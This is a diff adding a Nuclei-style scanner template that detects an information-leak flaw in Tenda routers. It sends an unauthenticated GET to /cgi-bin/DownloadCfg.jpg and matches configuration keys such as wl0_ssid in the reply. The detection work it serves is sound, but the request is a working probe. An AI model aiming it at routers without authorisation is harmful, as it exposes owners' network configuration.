@@ -1,0 +1,30 @@
+id: tenda-router-downloadcfg-info-leak
+info:
+  name: Tenda Router DownloadCfg Information Leakage
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Tenda routers have an information leakage vulnerability that allows attackers to read sensitive system information by accessing specific endpoints.
+  tags:
+    - information-disclosure
+    - tenda
+  reference:
+    - http://www.tenda.com.cn/
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/DownloadCfg.jpg HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "wl0_ssid"
+          - "lan_netmask"
+          - "vlan_nat_port"
+        part: body
